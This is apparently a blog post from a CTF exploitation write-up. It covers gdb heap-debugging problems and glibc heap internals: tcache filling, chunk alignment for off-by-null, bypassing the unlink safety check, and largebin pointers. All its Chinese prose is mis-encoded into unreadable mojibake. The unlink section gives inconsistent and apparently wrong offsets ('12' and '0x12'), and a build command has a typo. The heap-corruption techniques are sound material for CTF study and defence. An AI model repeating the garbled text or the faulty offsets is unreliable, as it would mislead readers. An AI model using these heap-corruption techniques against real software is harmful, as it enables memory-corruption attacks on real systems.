<p>å°±å¥½åƒä¸€ä»¶äº‹æƒ…çš„å‘ç”Ÿé€šå¸¸æ‹¥æœ‰ç›´æ¥åŸå› å’Œæ ¹æœ¬åŸå› ï¼Œè€Œæˆ‘çš„ä¸€ç³»åˆ—è¡Œå¾„æ˜¯æ²¡æœ‰ç›´æ¥åŸå› çš„ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¾ˆç›´æ¥çš„é©±åŠ¨åŠ›æˆ–è€…å¾ˆç‰¹åˆ«çš„ç†ç”±ã€‚</p>
<p>è¿™æ˜¯ä¸€ä»¶éå¸¸å¥‡æ€ªçš„äº‹æƒ…ã€‚é€šå¸¸æ¥è¯´æˆ‘æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ˜ç¡®ç›®æ ‡çš„äººï¼Œä½†æ˜¯åœ¨è¿™ç§å…³é”®çš„äº‹æƒ…ä¸Šæˆ‘çš„é€‰æ‹©å´ä¸æ˜¯ç”±æˆ‘æœ¬äººå†³æ–­çš„ã€‚</p>
<p>è¿™æœç„¶æ˜¯ä¸€ä»¶éå¸¸å¥‡æ€ªçš„äº‹æƒ…ï¼Œç¡¬è¦ç±»æ¯”ï¼Œå¯ä»¥æ¥ä¸€å¥ç»å…¸åè¨€ï¼šâ€ çˆ±ä¹Ÿå¦‚æ­¤ã€‚â€</p>
<h2 id="6ï¼‰extraï¼ˆæ…é‡è§‚çœ‹ï¼‰">6ï¼‰extraï¼ˆæ…é‡è§‚çœ‹ï¼‰<a class="post-anchor" href="#6ï¼‰extraï¼ˆæ…é‡è§‚çœ‹ï¼‰"></a></h2><p>extraéƒ¨åˆ†ã€‚</p>
<p>å¤šä¸ºè°ƒè¯•æ—¶é‡åˆ°çš„ç¯å¢ƒé—®é¢˜æˆ–è€…ä¸€äº›æ‡‚çš„éƒ½æ‡‚ä¸å¿…å¤šè¯´çš„åŸºç¡€çŸ¥è¯†ã€‚</p>
<p>ä½†æ˜¯æ€•è¢«è¯´æ°´è€ƒæ ¸å°±åŠ ä¸Šäº†ã€‚</p>
<p><strong>ppsï¼šå¹³æ—¶æ–‡æ¡£å†™å¤šäº†æ€»æœ‰ä¸€ç§å¥‡æ€ªçš„å¼•å¯¼çš„è¯­æ°”ã€‚ã€‚ã€‚è¦å¤šå…·ä½“æœ‰å¤šå…·ä½“çš„é‚£ç§ï¼Œæ‰€ä»¥åºŸè¯ä»¥åŠä¸å¿…è¦çš„æ“ä½œå·¨å¤šï¼Œæ…é‡è§‚çœ‹ã€‚</strong></p>
<p><strong>pppsï¼šåªè¦æˆ‘çš„è§£é¢˜çš„æ€è·¯çš„æ­£æ–‡éƒ¨åˆ†è¶³å¤Ÿç®€ç•¥æ¸…çˆ½ï¼Œå°±ä¸ä¼šæœ‰äººè¯´æˆ‘æ‹–æ³¥å¸¦æ°´ï¼ˆï¼‰</strong></p>
<h2 id="è°ƒè¯•éƒ¨åˆ†">è°ƒè¯•éƒ¨åˆ†<a class="post-anchor" href="#è°ƒè¯•éƒ¨åˆ†"></a></h2><h3 id="1-1-è§£å†³gdbæ— æ³•æŸ¥çœ‹heapç­‰ä¿¡æ¯çš„é—®é¢˜">1.1-è§£å†³gdbæ— æ³•æŸ¥çœ‹heapç­‰ä¿¡æ¯çš„é—®é¢˜<a class="post-anchor" href="#1-1-è§£å†³gdbæ— æ³•æŸ¥çœ‹heapç­‰ä¿¡æ¯çš„é—®é¢˜"></a></h3><p>æŒ‡å®šlibcåŠ è½½åè¿›è¡Œè°ƒè¯•ã€‚å‘ç°gdbæ— æ³•æ˜¾ç¤ºå½“å‰çš„å †å—ä»¥åŠé“¾è¡¨ä¿¡æ¯ã€‚</p>
<pre><code class="bash">hea
heap: This command only works with libc debug symbols.
They can probably be installed via the package manager of your choice.
See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html

E.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries):
sudo apt-get install libc6-dbg
sudo dpkg --add-architecture i386
sudo apt-get install libc-dbg:i386
</code></pre>
<h5 id="1ï¼‰é€šè¿‡pwntoolsåŠ è½½å¸¦æœ‰dbgç¬¦å·çš„libc">1ï¼‰é€šè¿‡pwntoolsåŠ è½½å¸¦æœ‰dbgç¬¦å·çš„libc<a class="post-anchor" href="#1ï¼‰é€šè¿‡pwntoolsåŠ è½½å¸¦æœ‰dbgç¬¦å·çš„libc"></a></h5><p>åŠ è½½å¸¦æœ‰<code>degub_symbols</code>çš„libcï¼Œä¸€èˆ¬æ¥è¯´æ˜¯æ‰‹åŠ¨æ·»åŠ æˆ–è€…åŠ è½½å¸¦æœ‰è°ƒè¯•ç¬¦å·çš„libcï¼Œglibcå®˜æ–¹æ–‡æ¡£å¯¹æ­¤è¿›è¡Œäº†è¯´æ˜ã€‚</p>
<p>åè€…å¯ä»¥ä»æ¸…åé•œåƒç«™ä¸‹è½½ã€‚</p>
<p>è¿™é‡ŒèŠ±äº†ä¸€äº›æ—¶é—´é‡æ–°äº†è§£äº†ä¸€å†™glibcé“¾æ¥åº“çš„ä¸€äº›çŸ¥è¯†ã€‚</p>
<p>æ›´æ”¹åçš„è„šæœ¬å¦‚ä¸‹</p>
<pre><code class="python">r = process(["./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6"})
context.log_level = 'debug'
libc = ELF('./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')
</code></pre>
<p>æ‰§è¡Œå¤±è´¥ã€‚æŠ¥é”™æ˜¯ <code>doesn't have any GOT symbols, skipping PLT</code></p>
<p>æš‚æœªæ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚</p>
<h5 id="2ï¼‰æ‰‹åŠ¨æŸ¥çœ‹å †å†…å­˜ä¿¡æ¯">2ï¼‰æ‰‹åŠ¨æŸ¥çœ‹å †å†…å­˜ä¿¡æ¯<a class="post-anchor" href="#2ï¼‰æ‰‹åŠ¨æŸ¥çœ‹å †å†…å­˜ä¿¡æ¯"></a></h5><p>æ ¹æ®å†…å­˜åˆ†å¸ƒæ‰¾åˆ°å †ä¸Šæ•°æ®çš„åœ°å€ï¼Œç„¶åé€šè¿‡<code>x/gx</code>å‘½ä»¤æ‰‹åŠ¨æŸ¥çœ‹ã€‚</p>
<p>é‚£ä¹ˆå¦‚ä½•æ‰¾åˆ°å †æ•°æ®å…·ä½“çš„å†…å­˜åœ°å€ï¼Ÿ</p>
<p>æ‰“å¼€ä¸€ä¸ªç®€å•çš„å †é¢˜æ¥å‚è€ƒã€‚</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135759930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>å¯ä»¥çœ‹åˆ°heapå¤´åœ°å€åœ¨B008ï¼Œæ¯”bss_endè¶³è¶³é«˜äº†FA5ã€‚</p>
<p>æ‰€ä»¥å¹¶æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆè”ç³»æã€‚ã€‚ã€‚</p>
<h5 id="3ï¼‰æ‰‹åŠ¨ç¼–è¯‘degubç‰ˆæœ¬çš„libc">3ï¼‰æ‰‹åŠ¨ç¼–è¯‘degubç‰ˆæœ¬çš„libc<a class="post-anchor" href="#3ï¼‰æ‰‹åŠ¨ç¼–è¯‘degubç‰ˆæœ¬çš„libc"></a></h5><p>ä¸‹è½½ç›¸åº”çš„glibcæºç å¹¶ç¼–è¯‘ã€‚</p>
<p>ç¼–è¯‘æ—¶éœ€è¦å¼€å¯debug</p>
<pre><code>mkdir build &amp;&amp; cd biuld
../configure --prefix = /usr/local/glibc-2.29 --enable-debug = yes
make -j4 &amp;&amp; sudo make install
#64 bit
</code></pre>
<p>ç¼–è¯‘å®Œæˆåå¯ä»¥é€šè¿‡é“¾æ¥è¯¥åº“ç›´æ¥ç¼–è¯‘ç¨‹åºæºä»£ç ã€‚</p>
<p>å¦‚æœéœ€è¦ç”¨è¯¥ç‰ˆæœ¬é“¾æ¥åº“æ‰§è¡Œå·²ç¼–è¯‘çš„ç¨‹åºçš„è¯å¯ä»¥æ›¿æ¢äºŒè¿›åˆ¶æ–‡ä»¶è§£é‡Šå™¨è·¯å¾„ï¼Œä½†æ˜¯å¿…é¡»ä¿®æ”¹ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¨‹åºå¤´ï¼Œå°†æˆ‘ä»¬éœ€è¦çš„ldè·¯å¾„å†™å…¥ã€‚ldè·¯å¾„ä¸libcä¸­çš„ldè·¯å¾„å¿…é¡»åŒ¹é…ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼Œå¯¼è‡´ç³»ç»ŸæŒ‡ä»¤æ— æ³•æ‰§è¡Œã€‚</p>
<p>ç„¶åæ›´æ”¹LD_PRELOADç¯å¢ƒå˜é‡</p>
<h3 id="1-2-è§£å†³libc-so-6ç›¸å…³æŠ¥é”™é—®é¢˜">1.2-è§£å†³libc.so.6ç›¸å…³æŠ¥é”™é—®é¢˜<a class="post-anchor" href="#1-2-è§£å†³libc-so-6ç›¸å…³æŠ¥é”™é—®é¢˜"></a></h3><p>ä¸Šè¿°è„šæœ¬æ‰§è¡Œåï¼Œpython3æŠ¥é”™ï¼ŒåŸå› å¤§è‡´æ˜¯æ²¡æœ‰<code>libc.so.6</code>æ–‡ä»¶ã€‚</p>
<p>æŸ¥çœ‹å¯¹åº”æ–‡ä»¶å¤¹å‘ç°æƒ…å†µå±å®ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆæ˜¯æ‰‹åŠ¨åˆ›å»ºå¯¹åº”çš„<code>lib.so.6</code>æ–‡ä»¶ã€‚</p>
<h3 id="1-3-é™„åŠ è°ƒè¯•åçš„åœ°å€éšæœºåŒ–é—®é¢˜ã€‚">1.3-é™„åŠ è°ƒè¯•åçš„åœ°å€éšæœºåŒ–é—®é¢˜ã€‚<a class="post-anchor" href="#1-3-é™„åŠ è°ƒè¯•åçš„åœ°å€éšæœºåŒ–é—®é¢˜ã€‚"></a></h3><p>ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œç¯å¢ƒæ˜¯ubuntu18.04ï¼Œlibcé»˜è®¤2.27.</p>
<p>gdbç›´æ¥è°ƒè¯•ç¨‹åºï¼Œå†…å­˜åœ°å€æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯ä¸€æ—¦åˆ©ç”¨è„šæœ¬è¿›è¡Œé™„åŠ è°ƒè¯•å°±ä¼šå‡ºç°åœ°å€éšæœºåŒ–ã€‚</p>
<p>é™„åŠ è°ƒè¯•ä¸‹çš„heap</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135831417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>ç›´æ¥è°ƒè¯•ä¸‹çš„heap</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135852934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a>æˆ‘æ€€ç–‘æ˜¯gdbçš„é…ç½®å‡ºäº†ç‚¹ä»€ä¹ˆæ¯›ç—…ï¼Œè¿™ä¸ªubuntu18ç¯å¢ƒæ˜¯æˆ‘ä¹‹å‰éšä¾¿è£…çš„ï¼Œæ²¡æ€ä¹ˆç®¡ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>1ï¼šæš‚æ— </p>
<p>2 : æ— è§†é—®é¢˜ï¼Œæ‘è°ƒã€‚</p>
<h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†<a class="post-anchor" href="#åŸºç¡€çŸ¥è¯†"></a></h2><h3 id="2-1-Tcacheçš„å®‰å…¨é—®é¢˜">2.1-Tcacheçš„å®‰å…¨é—®é¢˜<a class="post-anchor" href="#2-1-Tcacheçš„å®‰å…¨é—®é¢˜"></a></h3><p>2.27ç‰ˆæœ¬ä¸‹ç›¸å¯¹äº2.23æ–°å¢äº†tcacheæœºåˆ¶ã€‚</p>
<p>Tcacheä¸ºæ¯ä¸€ä¸ªçº¿ç¨‹åˆ›å»ºç¼“å­˜ï¼Œå³å†…å«ä¸€äº›å †å—ï¼Œæ¯ä¸ªçº¿ç¨‹åˆ†é…64ä¸ªbinsï¼Œä¸€ä¸ªbinsæœ€å¤šå­˜7ä¸ªchunkï¼Œ64ä½ä¸‹chunkçš„å¤§å°ä»¥16å­—èŠ‚é€’å¢ï¼Œä¹Ÿå°±æ˜¯æœ€å¤§1032bï¼Œæ‰€ä»¥Tcacheå¹¶ä¸èƒ½å­˜æ”¾large binã€‚ï¼Œ</p>
<p>é‡Šæ”¾å †å—æ—¶ï¼Œå¦‚æœchunkå¤§å°ç¬¦åˆè¦æ±‚å°±æ”¾å…¥Tcacheï¼Œç›´åˆ°Tcacheè¢«å¡«æ»¡ï¼Œè¿™ä¸ªæ“ä½œæ˜¯ä¼˜å…ˆäºfastbinæˆ–è€…å…¶ä»–æ“ä½œçš„ã€‚</p>
<p>åˆ†é…å †å—æ—¶ï¼Œå¦‚æœä»fastbinè¿”å›äº†ä¸€ä¸ªåˆé€‚çš„chunkï¼Œé‚£ä¹ˆfastbinä¸­çš„å…¶ä»–chunkéƒ½ä¼šè¢«æ”¾å…¥Tcacheï¼ˆé™¤éè¢«è£…æ»¡ï¼‰ï¼ŒsmallbinåŒç†ã€‚</p>
<p>ä»¥åŠï¼Œåˆ†é…å †å—æ—¶ï¼Œå¦‚æœTcacheä¸­æœ‰åˆé€‚çš„chunkï¼Œå°±ä»å…¶ä¸­å–å‡ºæ¥ï¼Œè¿™ä¹Ÿæ˜¯ä¼˜å…ˆäºå…¶ä»–binçš„ã€‚</p>
<p>å¯ä»¥çœ‹å‡ºTcacheçš„ä¼˜å…ˆçº§æ¯”è¾ƒé«˜ï¼Œè¿™å°±å¯¼è‡´å¾ˆå¤šæœ‰æ•ˆçš„æ£€æµ‹å°†è¢«è·³è¿‡ï¼Œåœ¨æå‡æ‰§è¡Œæ•ˆç‡çš„åŒæ—¶ä¹Ÿå¤§å¤§æå‡äº†å®‰å…¨é£é™©ã€‚</p>
<p>è™½ç„¶ä½†æ˜¯ï¼Œæœ¬é¢˜çš„2.27ç‰ˆæœ¬ä¸æ¶‰åŠTcacheçš„å®‰å…¨æ¼æ´åˆ©ç”¨ã€‚åªéœ€è¦å°†tcacheå¡«æ»¡å°±è¡Œã€‚</p>
<pre><code class="python">for i in range(7)
    add(248,b'fill')
    freeï¼ˆiï¼‰
</code></pre>
<p>Ps:æ¯ä¸ªsizeçš„Tcacheæœ€å¤šæœ‰7ä¸ªï¼Œä¹Ÿå°±æ˜¯è¿ç»­ç”³è¯·7ä¸ª0xf8çš„chunkå†é‡Šæ”¾å°±èƒ½æŠŠtcacheå¡«æ»¡ã€‚</p>
<h3 id="2-2-chunkçš„sizeçš„å†…å­˜å¯¹é½é—®é¢˜">2.2-chunkçš„sizeçš„å†…å­˜å¯¹é½é—®é¢˜<a class="post-anchor" href="#2-2-chunkçš„sizeçš„å†…å­˜å¯¹é½é—®é¢˜"></a></h3><p>é¢˜ç›®ä¸­æˆ‘ä»¬ç”³è¯·äº†å››ä¸ªsizeä¸º0xF8çš„chunk ç”³è¯·åçš„heapä¿¡æ¯å¦‚ä¸‹</p>
<pre><code class="bash">Allocated chunk | PREV_INUSE#æˆªå–äº†chunk0çš„ä¿¡æ¯ï¼Œåœ°å€é—®é¢˜æ‰¿æ¥ä¸Šæ–‡ã€‚
Addr: 0x1b39250
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x1b39270
Size: 0x101
----------------------------------------------------------------
pwndbg&gt; x/50gx 0x1b39250
0x1b39250:    0x0000000000000000    0x0000000000000021
0x1b39260:    0x0000000001b39280    0x0000000000000000
0x1b39270:    0x0000000000000000    0x0000000000000101
0x1b39280:    0x0000000a61616161    0x0000000000000000
0x1b39290:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„å·®é”™ã€‚</p>
<p>ç„¶è€Œé’ˆå¯¹å®é™…æƒ…å†µï¼Œæˆ‘ä»¬æå‡ºä¸¤ä¸ªé—®é¢˜ã€‚</p>
<p>1ï¼‰ä¸ºä»€ä¹ˆ0xf8å®é™…æ˜¯0x101ï¼Ÿ</p>
<p>0xF8 + 0x8 = 0x100ï¼ˆpsï¼š101ä¸­çš„æœ€ä½ä½çš„1æ˜¯prev inuseä½ï¼‰</p>
<p>ä¹Ÿå°±æ˜¯å®é™…æ¯”æˆ‘ä»¬ç”³è¯·çš„å¤šäº†å…«ä¸ªå­—èŠ‚ã€‚</p>
<p>é‚£ä¹ˆæ˜¯ä¸æ˜¯æˆ‘ä»¬ç”³è¯·çš„æ¯ä¸ªå †å—çš„å®é™…å¤§å°éƒ½ä¼šæ¯”åŸæ¥å¤š0x8å‘¢ï¼Ÿ</p>
<p>å…·ä½“æ¥è¯•ä¸€è¯•ã€‚è¿™æ¬¡æˆ‘ä»¬ç”³è¯·0xf0å¤§å°çš„chunkã€‚</p>
<pre><code class="bash">Allocated chunk | PREV_INUSE
Addr: 0x908270
Size: 0x101#chunkçš„sizeè¿˜æ˜¯0x101ï¼Œç›¸å½“äºè¿™æ¬¡å¢åŠ äº†0x16
</code></pre>
<p>æ³¨æ„åˆ°ä¸¤ä¸ªå€¼ä¸€ä¸ª16å­—èŠ‚å¯¹é½ï¼Œå¦ä¸€ä¸ªæ˜¯16çš„å€æ•°å†åŠ äº†å…«å­—èŠ‚ã€‚</p>
<p>äº‹å®ä¸Šå°±æ˜¯mallocçš„å¯¹é½æœºåˆ¶ã€‚æœºåˆ¶æ¯”è¾ƒå®Œå–„çš„ç¼–è¯‘å™¨ä¼šä¸ºæˆ‘ä»¬mallocçš„chunksizeè‡ªåŠ¨å¯¹è¿›è¡Œå†…å­˜å¯¹é½ã€‚æ¯”å¦‚è¯´malloc 0x15çš„chunkï¼Œå†…å­˜ä¸­å°±æ˜¯0x21ã€‚0x21çš„æ¥æºå°±æ˜¯mallocè‡ªåŠ¨ä¸º0x15è¿›è¡Œå†…å­˜å¯¹é½ã€‚</p>
<pre><code class="bash">0x12a5270:    0x0000000000000000    0x0000000000000021
0x12a5280:    0x0000000a61616161    0x0000000000000000
</code></pre>
<p>å›åˆ°é—®é¢˜æœ¬èº«ï¼Œé‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä¸“é—¨ç”³è¯·16+8çš„sizeå‘¢ï¼Ÿ</p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œptmallocä¸­æœ‰ä¸€ä¸ªç¥å¥‡çš„èŠ‚çº¦å†…å­˜ç©ºé—´çš„å†…å­˜å¤ç”¨æœºåˆ¶ï¼š</p>
<p>ä¼—ä¼—æ‰€å‘¨çŸ¥ï¼Œmallocè§„å®šï¼Œåªæœ‰å½“æœ¬chunkçš„å‰ä¸€ä¸ªchunkä¸ºfreeçŠ¶æ€çš„æ—¶å€™ï¼Œæœ¬chunkçš„prev sizeæ‰æ˜¯æœ‰æ„ä¹‰çš„ï¼Œå¦‚æœæœ¬chunkçš„å‰ä¸€ä¸ªchunkå¤„äºallocatedçŠ¶æ€ï¼Œé‚£ä¹ˆå³ä¸ä½¿ç”¨æœ¬chunkçš„prev sizeã€‚</p>
<p>åŸºäºè¿™ç§è§„å®šï¼Œå½“å¤„äºalocatedçŠ¶æ€çš„prev chunkè¶Šæ¥è¶Šå¤šï¼ŒåŠ¿å¿…ä¼šé€ æˆä¸€äº›æµªè´¹ï¼Œæ‰€ä»¥mallocåˆè§„å®šï¼Œå¦‚æœæœ¬chunkç”³è¯·æ—¶sizeå¤§å°æ˜¯16çš„å€æ•°ï¼Œé‚£ä¹ˆå°±åœ¨å®ƒå‰é¢å¢åŠ prev sizeä½å’Œsizeä½ï¼Œå¦‚æœæ˜¯16x+8çš„å½¢å¼ï¼Œé‚£ä¹ˆåªåœ¨chunkå‰å¢åŠ sizeä½ï¼Œprev sizeä½åˆ™å‚¨å­˜åœ¨prev chunkçš„æœ€åå…«ä½ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹ç¢°è§çš„æƒ…å†µã€‚</p>
<p>å› æ­¤æˆ‘ä»¬è¦å¯¹chunkè¿›è¡Œoff by nullï¼Œé‚£ä¹ˆå®ƒçš„prev sizeä½è‚¯å®šæ˜¯è¦å¯æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ç”³è¯·16+8ï¼Œå°†prev sizeåˆ†é…åˆ°ä¸Šä¸€ä¸ªchunkä¸­ä¾›æˆ‘ä»¬ç¯¡æ”¹ã€‚</p>
<p>2ï¼‰chunkçš„sizeå¤§å°é—®é¢˜ï¼Œæœ‰å¾ˆå¤šsizeä¾›æˆ‘ä»¬é€‰æ‹©ï¼Œä¸ºä»€ä¹ˆååè¦æ˜¯0xf8ï¼Ÿ</p>
<p>è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œç¬¬äºŒä¸ªé—®é¢˜å…¶å®å¾ˆå¥½è§£é‡Šã€‚é¦–å…ˆå‰æ–‡è¯´åˆ°çš„ï¼Œè¦ç©ºå­—èŠ‚æº¢å‡ºï¼Œsizeå°±ä¸èƒ½å¤ªå°ã€‚å…¶æ¬¡sizeæ˜¯16çš„å€æ•°+8ã€‚æ»¡è¶³äº†è¿™ä¸¤ä¸ªæ¡ä»¶åªè¦ä¸æ˜¯å¤§å¾—ç¦»è°±ï¼ˆåˆ«è·‘å»large binæˆ–è€…mmapäº†ï¼‰ï¼Œéšä¾¿å•¥sizeéƒ½å¯ä»¥ï¼Œä½†æ˜¯å¤ªå¤§ä¹Ÿä¸å¥½æŒæ§è¿˜æµªè´¹ç©ºé—´ã€‚</p>
<h3 id="2-3-unlinkï¼Ÿ">2.3-unlinkï¼Ÿ<a class="post-anchor" href="#2-3-unlinkï¼Ÿ"></a></h3><p>ä¸ç®¡æ˜¯2.23è¿˜æ˜¯2.27ï¼Œunlinkæœ€ç»ˆç›®æ ‡éƒ½æ˜¯é€šè¿‡å †å æ¥ä¿®æ”¹chunkæŒ‡é’ˆçš„å†…å®¹ã€‚</p>
<p>é‚£ä¸ºä»€ä¹ˆæ˜¯unlinkï¼Œè€Œä¸æ˜¯å…¶ä»–æ–¹æ³•ï¼Ÿ</p>
<p>é¦–å…ˆæ¥å›é¡¾ä¸€ä¸‹unlinkçš„åˆ©ç”¨è¿‡ç¨‹ã€‚</p>
<p>åœ¨æœ‰æ£€æµ‹çš„æƒ…å†µä¸‹ï¼Œç»•è¿‡æ£€æµ‹æ˜¯åˆ©ç”¨unlinkçš„è¾ƒä¸ºå…³é”®çš„ä¸€æ­¥ã€‚</p>
<p>æ£€æµ‹ä½¿å¾—æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹next chunk çš„fd å’Œbkåè¿›è¡Œunlinkã€‚ç»•è¿‡çš„æ–¹å¼ä¹Ÿæœ‰ã€‚fdå’Œbkåªè¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œåˆ™ä¼šè§¦å‘target chunkçš„unlinkã€‚</p>
<pre><code class="c">fakeFD -&gt; bk == P` ï¼Œç­‰ä»·äº `*(fakeFD + 12) == P
fakeBK -&gt; fd == P`` ï¼Œç­‰ä»·äº`*(fakeBK + 8) == P
</code></pre>
<!--0x12å’Œ0x8çš„æ¥æºå‚è€ƒchunkçš„ç»“æ„ã€‚-->

<p>è§¦å‘åï¼Œæ“ä½œå¦‚ä¸‹</p>
<ul>
<li><p><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></p>
</li>
<li><p><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></p>
<p>å¦‚æœ<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code></p>
<p>é‚£ä¹ˆä¹Ÿå°±æ˜¯</p>
<p><code>*P = P - 12</code></p>
</li>
</ul>
<p>è¿™æ ·pçš„åœ°å€å°±å‘ä¸‹åç§»äº†0x12ä¸ªå­—èŠ‚ã€‚</p>
<p>è®¾ç½®<code>*(fakeFD + 12)</code>=<code>*(fakeBK + 8)</code>=<code>*P</code>çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦<code>fake_fd = nextchunkptr - 0x12ï¼Œfake_ bk = nextchunk -0x8</code>å°±è¡Œã€‚</p>
<p>è™½ç„¶è¿™æ ·å¤§è´¹å‘¨ç« ä¹Ÿåªæ˜¯è®©påœ°å€ä¸‹ç§»äº†12ï¼Œä½†æ˜¯è¿™0x12å­—èŠ‚è¶³å¤Ÿæˆ‘ä»¬æ„é€ å †å äº†ã€‚</p>
<p>psï¼šå¯ä»¥ç±»æ¯”æ•°å­¦è¯æ˜é¢˜æ¥ç†è§£è¿™æ®µç»•è¿‡çš„åˆ†ææ€è·¯ã€‚ä»ä½¿æ£€æµ‹æˆç«‹çš„ç»“æœä¸€æ­¥æ­¥é€†æ¨ï¼Œè¿™é‡Œä½¿ç”¨çš„å°±æ˜¯â€æ ¹æ®ç»“æœæ¨åŸå› â€ï¼Œå±äºâ€œåˆ†ææ³•â€</p>
<h3 id="2-4-largebin">2.4-largebin<a class="post-anchor" href="#2-4-largebin"></a></h3><p><del>å…¶å®äº†è§£large binæˆ–è€…largebin attackå‰è¿˜éœ€è¦äº†è§£unsortedbinï¼Œä½†æ˜¯unsortedbinæ„Ÿè§‰ä¸æ˜¯é‡ç‚¹ã€‚</del></p>
<p>ç¨å¾®ä»‹ç»æœ¬é¢˜ä¸­å…³äºlargebin chunkçš„ä¸€äº›æ¯”è¾ƒå…³é”®çš„æ•°æ®æ„ã€‚</p>
<p>ä¸ºäº†åŠ å¿«æ£€ç´¢é€Ÿåº¦ï¼Œlargebiné“¾è¡¨å¢åŠ äº†fd_nextsize,bk_nextsizeæŒ‡é’ˆï¼Œç”¨äºæŒ‡å‘ç¬¬ä¸€ä¸ªä¸è‡ªå·±å¤§å°ä¸åŒçš„chunkï¼ˆæ‰€ä»¥åªæœ‰å½“largebinä¸­æœ‰ä¸¤ä¸ªå¤§å°ä¸åŒçš„chunkæ—¶ï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆæ‰ä¼šè¢«ä¿®æ”¹)ã€‚å¦‚æœ large bin ä¸­ä»…æœ‰ä¸€ä¸ª chunkï¼Œé‚£ä¹ˆè¯¥ chunk çš„ä¸¤ä¸ª nextsize æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±ã€‚</p>
<p>largebinä¸­çš„chunkå¤§è‡´ç»“æ„å¦‚ä¸‹</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20210715135936538.png" data-caption="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20210715135936538.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
</body></html>

  
  <div class="post-guide">
    <div class="item left">
        
          <a href="../../03/patch%20alarm/">patch'alarm</a>
        
    </div>
    <div class="item right">
        
          <a href="../ret2dl_advanced/">ret2dl_advanced</a>
        
    </div>
  </div>

  


  <div id="comment"></div>

  
  <!-- Highlight.js -->

<link rel="stylesheet"
href="//highlightjs.org/static/demo/styles/night-owl.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
</script>
<script>
hljs.initHighlightingOnLoad();

</script>
</article>
        <footer>
